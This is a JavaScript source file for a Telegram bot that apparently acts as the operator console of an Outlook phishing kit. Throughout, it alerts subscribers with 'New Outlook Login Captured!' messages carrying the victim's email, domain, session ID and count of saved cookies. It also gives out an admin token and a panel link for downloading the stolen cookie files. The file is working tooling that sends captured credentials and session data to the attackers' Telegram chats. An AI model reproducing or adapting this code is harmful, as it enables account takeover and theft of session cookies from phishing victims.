const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

class AdminTokenBot {
    constructor() {
        this.token = process.env.TELEGRAM_BOT_TOKEN;
        this.bot = new TelegramBot(this.token, { polling: true });
        this.chatIds = new Set(); // Store user chat IDs for notifications
        this.rateLimits = new Map(); // Rate limiting per chat ID
        this.subscriptionsFile = path.join(__dirname, 'telegram_subscriptions.json');
        
        // Load persistent subscriptions
        this.loadSubscriptions();
        
        this.setupCommands();
        this.setupEventHandlers();
        console.log('🤖 Telegram Bot initialized successfully');
    }

    // Load persistent subscriptions from file
    loadSubscriptions() {
        try {
            if (fs.existsSync(this.subscriptionsFile)) {
                const data = fs.readFileSync(this.subscriptionsFile, 'utf8');
                const subscriptions = JSON.parse(data);
                this.chatIds = new Set(subscriptions.chatIds || []);
                console.log(`📋 Loaded ${this.chatIds.size} subscription(s) from persistent storage`);
            }
        } catch (error) {
            console.error('Error loading subscriptions:', error.message);
            this.chatIds = new Set();
        }
    }

    // Save subscriptions to file
    saveSubscriptions() {
        try {
            const data = {
                chatIds: Array.from(this.chatIds),
                lastUpdated: new Date().toISOString()
            };
            fs.writeFileSync(this.subscriptionsFile, JSON.stringify(data, null, 2));
        } catch (error) {
            console.error('Error saving subscriptions:', error.message);
        }
    }

    // Rate limiting check
    checkRateLimit(chatId, command) {
        const now = Date.now();
        const key = `${chatId}_${command}`;
        const lastCall = this.rateLimits.get(key) || 0;
        
        // Allow 1 command per 2 seconds per user
        if (now - lastCall < 2000) {
            return false;
        }
        
        this.rateLimits.set(key, now);
        
        // Clean up old entries every 100 requests
        if (this.rateLimits.size > 100) {
            for (const [k, time] of this.rateLimits.entries()) {
                if (now - time > 60000) { // Remove entries older than 1 minute
                    this.rateLimits.delete(k);
                }
            }
        }
        
        return true;
    }

    setupCommands() {
        // Welcome message with Get Admin Token button
        this.bot.onText(/\/start/, (msg) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'start')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before sending another command.');
                return;
            }
            
            this.chatIds.add(chatId);
            this.saveSubscriptions();
            
            const welcomeMessage = `
🔐 *Admin Token & Outlook Notifications Bot*

Welcome! I can help you with:

*Admin Access:*
Click the button below to get your admin token

*Notifications:*
/notify on - Enable Outlook login notifications
/notify off - Disable notifications  

You'll automatically receive notifications when valid Outlook logins are captured! 🔔
            `;
            
            this.bot.sendMessage(chatId, welcomeMessage, { 
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '🔑 Get Admin Token', callback_data: 'get_token' }
                    ]]
                }
            });
        });

        // Notification controls
        this.bot.onText(/\/notify (on|off)/, (msg, match) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'notify')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before changing notification settings.');
                return;
            }
            
            const action = match[1];
            
            if (action === 'on') {
                this.chatIds.add(chatId);
                this.saveSubscriptions();
                this.bot.sendMessage(chatId, '🔔 Outlook login notifications enabled! You\'ll receive alerts when valid logins are captured.');
            } else {
                this.chatIds.delete(chatId);
                this.saveSubscriptions();
                this.bot.sendMessage(chatId, '🔕 Outlook login notifications disabled.');
            }
        });

        // Help command
        this.bot.onText(/\/help/, (msg) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'help')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before requesting help again.');
                return;
            }
            
            const helpMessage = `
🔐 *Admin Token & Notifications Bot*

*Available Commands:*
• /start - Show welcome message and token button
• /notify on - Enable login notifications  
• /notify off - Disable notifications
• /help - Show this help message

*How it works:*
1. Click "Get Admin Token" to access the admin panel
2. Enable notifications to get alerts when Outlook logins are captured
3. Each notification includes login details and quick access to admin panel

You'll receive real-time notifications when Outlook logins are captured! 🔔
            `;
            
            this.bot.sendMessage(chatId, helpMessage, { 
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '🔑 Get Admin Token', callback_data: 'get_token' }
                    ]]
                }
            });
        });
    }

    setupEventHandlers() {
        // Handle callback queries (inline buttons)
        this.bot.on('callback_query', (query) => {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            
            if (!this.checkRateLimit(chatId, 'callback')) {
                this.bot.answerCallbackQuery(query.id, { text: 'Please wait before clicking again.' });
                return;
            }
            
            if (query.data === 'get_token') {
                const adminToken = global.adminToken || 'Token not available';
                const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/admin.html`;
                
                const tokenMessage = `
🔑 *Your Admin Token*

\`${adminToken}\`

🌐 **Admin Panel:** [Click here to access](${adminUrl})

*How to use:*
1. Copy the token above
2. Visit the admin panel link  
3. Enter the token to authenticate
4. View all saved sessions and download cookie files

*Security Note:* This token gives full access to your admin panel. Keep it secure!
                `;

                this.bot.editMessageText(tokenMessage, {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '🔄 Refresh Token', callback_data: 'get_token' },
                            { text: '🌐 Open Admin Panel', url: adminUrl }
                        ]]
                    }
                });
            }
            
            this.bot.answerCallbackQuery(query.id);
        });

        // Error handling
        this.bot.on('error', (error) => {
            console.error(`Telegram Bot error: ${error.code} - ${error.message}`);
        });

        this.bot.on('polling_error', (error) => {
            console.error(`Telegram Bot polling error: ${error.code} - ${error.message}`);
        });
    }

    // Method to send login notifications
    async sendLoginNotification(loginData) {
        if (this.chatIds.size === 0) {
            console.log('No Telegram users subscribed to notifications');
            return;
        }

        const { email, domain, timestamp, totalCookies, sessionId } = loginData;
        const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/admin.html`;
        
        const notificationMessage = `
🔐 *New Outlook Login Captured!*

📧 **Email:** \`${email}\`
🏢 **Domain:** \`${domain}\`
🕐 **Time:** ${new Date(timestamp).toLocaleString()}
📊 **Cookies:** ${totalCookies} saved
🆔 **Session:** ${sessionId}

🌐 Access admin panel to view details and download cookies
        `;

        // Send notification to all subscribed users
        for (const chatId of this.chatIds) {
            try {
                await this.bot.sendMessage(chatId, notificationMessage, {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '🌐 Open Admin Panel', url: adminUrl },
                            { text: '🔑 Get Admin Token', callback_data: 'get_token' }
                        ]]
                    }
                });
            } catch (error) {
                console.error(`Failed to send notification to ${chatId}:`, error.message);
                // Remove invalid chat IDs
                if (error.code === 403) {
                    this.chatIds.delete(chatId);
                    this.saveSubscriptions();
                }
            }
        }
        
        console.log(`📤 Login notification sent to ${this.chatIds.size} Telegram users`);
    }

    getSubscribedUsers() {
        return this.chatIds.size;
    }
}

module.exports = AdminTokenBot;